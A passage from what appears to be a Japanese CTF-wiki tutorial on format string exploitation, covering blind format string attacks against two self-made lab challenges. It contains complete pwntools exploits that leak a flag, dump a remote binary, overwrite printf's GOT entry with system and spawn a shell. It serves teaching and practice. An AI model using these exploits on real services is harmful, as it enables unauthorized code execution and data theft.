ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))

part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()
```

なお、この方法では安定して shell を得られません。一度に非常に長い文字列を入力しているためです。しかし、前の段階で入力したいアドレスを制御する方法がないので、こうするしかありません。

なぜこんなに多く出力する必要があるのでしょうか。書式文字列がスタック上にないため、書き換えたい ebp のアドレスがわかっても、そのアドレスをスタックに書き込み、$ 記号で位置を指定することができません。位置を指定できないので、l や ll などの方法でこのアドレスを書き込むこともできません。そのため、大量に出力するしかないのです。

## 書式文字列のブラインド攻撃

### 原理

書式文字列のブラインド攻撃とは、やり取りできる ip アドレスとポートだけが与えられ、対応する binary ファイルが与えられない状態で pwn を行うものです。実は BROP とほぼ同じですが、BROP はスタックオーバーフローを利用するのに対し、ここでは書式文字列脆弱性を利用します。一般に、次の手順で行います。

- プログラムのビット数を確定する
- 脆弱性の位置を確定する
- 利用する

大会後にソースコードが公開された問題が見つからなかったので、自分で簡単に二つの問題を作りました。

### 例 1 - スタックの leak

ソースコードとデプロイ用ファイルは、対応するフォルダ [fmt_blind_stack](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/blind_fmt_stack) に置いてあります。

#### プログラムのビット数の確認

適当に %p を入力すると、プログラムは次の情報を返しました。

```shell
➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
%p
0x7ffd4799beb0
G�flag is on the stack%                          
```

flag がスタック上にあること、そしてこのプログラムが 64 ビットであること、さらに書式文字列脆弱性があるはずであることがわかります。

#### 利用

では、少しずつ試してみましょう。

```python
from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1

```

最後に出力をざっと見て、flag が得られました。

```shell
////////
////////
\x00\x00\x00\x00\x00\x00\x00\xff
flag{thi
s_is_fla
g}\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\xfe\x7f\x00\x00
```

### 例 2 - ブラインドでの got の奪取

ソースコードとデプロイ用ファイルは、すでに [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/blind_fmt_got) フォルダにあります。

#### プログラムのビット数の確認

簡単にテストすると、このプログラムは書式文字列脆弱性のある関数で、64 ビットプログラムであることがわかります。

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
%p
0x7fff3b9774c0
```

今回は何も返ってきません。ほかにも試しましたが特に変化はなかったので、元のプログラムを leak するしかありません。

#### オフセットの確認

プログラムを leak する前に、やはり書式文字列のオフセットを確定する必要があります。次のとおりです。

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
aaaaaaaa%p%p%p%p%p%p%p%p%p
aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
```

これにより、書式文字列の開始アドレスのオフセットが 6 であることがわかります。

#### binary の leak

プログラムは 64 ビットなので、0x400000 から leak します。一般に、書式文字列脆弱性のあるブラインド攻撃では '\x00' 文字を読み込めます。そうでなければ leak のしようがありません。そのほか、出力は必ず '\x00' で切り詰められます。書式文字列脆弱性の利用で使う出力関数はすべて '\x00' で切り詰められるためです。そこで、次の leak コードを使えます。

```python
##coding=utf8
from pwn import *

##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # \n が含まれている場合、新しい行になってしまうため
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
	addr = 0x400000
	f = open('binary', 'w')
	while addr < 0x401000:
		data = leak(addr)
		if data is None:
			f.write('\xff')
			addr += 1
		elif len(data) == 0:
			f.write('\x00')
			addr += 1
		else:
			f.write(data)
			addr += len(data)
	f.close()
getbinary()
```

なお、payload の中で '\n' が現れるかどうかを判定する必要があります。'\n' があると、元のプログラムが前の内容しか読み込まず、メモリを leak できなくなるため、そのようなアドレスはスキップする必要があります。

#### binary の解析

leak した binary を IDA で開き、プログラムのベースアドレスを変更してざっと見ると、元のプログラムの main 関数のアドレスをおおよそ確定できます。

```asm
seg000:00000000004005F6                 push    rbp
seg000:00000000004005F7                 mov     rbp, rsp
seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
seg000:00000000004005FE
seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
seg000:00000000004005FE                 lea     rax, [rbp-80h]
seg000:0000000000400602                 mov     edx, 80h ; '€'
seg000:0000000000400607                 mov     rsi, rax
seg000:000000000040060A                 mov     edi, 0
seg000:000000000040060F                 mov     eax, 0
seg000:0000000000400614                 call    sub_4004C0
seg000:0000000000400619                 lea     rax, [rbp-80h]
seg000:000000000040061D                 mov     rdi, rax
seg000:0000000000400620                 mov     eax, 0
seg000:0000000000400625                 call    sub_4004B0
seg000:000000000040062A                 mov     rax, cs:601048h
seg000:0000000000400631                 mov     rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0
seg000:0000000000400639                 jmp     short loc_4005FE
```

sub\_4004C0 は read 関数だと確定できます。読み込み関数が三つの引数を取るなら、ほぼ read だからです。また、その下で呼び出している sub\_4004B0 は出力関数のはずです。その後さらに別の関数を呼び出し、そのあと再び読み込み関数に戻っています。したがって、プログラムは while 1 のループでずっと実行され続けているはずです。

#### 利用の方針

以上の解析から、次の基本方針を確定できます。

- printf 関数のアドレスを leak する、
- 対応する libc と system 関数のアドレスを取得する
- printf のアドレスを system 関数のアドレスに書き換える
- /bin/sh; を読み込ませて shell を得る

#### 利用プログラム

プログラムは次のとおりです。

```python
##coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # \n が含まれている場合、新しい行になってしまうため
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None


def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


##getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)
## let the read get resolved
sh.sendline('a')
sh.recv()
## get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)

## get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

## get shell
sh.sendline('/bin/sh;')
sh.interactive()
```

ここで次のコードに注意が必要です。

```python
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()
```

fmtstr\_payload が直接生成する payload は、アドレスを前に置きます。これは printf で '\x00' による切り詰めを起こします(**この問題について、pwntools では現在 fmt\_payload の強化版を開発中で、まもなくできる見込みです**)。そこでいくつかのテクニックを使って、アドレスを後ろに置きました。主な考え方は、アドレスを後ろの 8 バイトアラインされた位置に置き、payload 内のオフセットを修正することです。注意が必要なのは次の部分です。

```python
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
```

この行は、修正後のアドレスの書式文字列内でのオフセットを与えています。このようになるのは、どう修正しても、'%order$hn' の order で増える文字数が 8 を超えることはないためです。詳しくは各自で導出してください。

### 問題
- SuCTF2018 - lock2(主催者が docker イメージ suctf/2018-pwn-lock2 を提供)
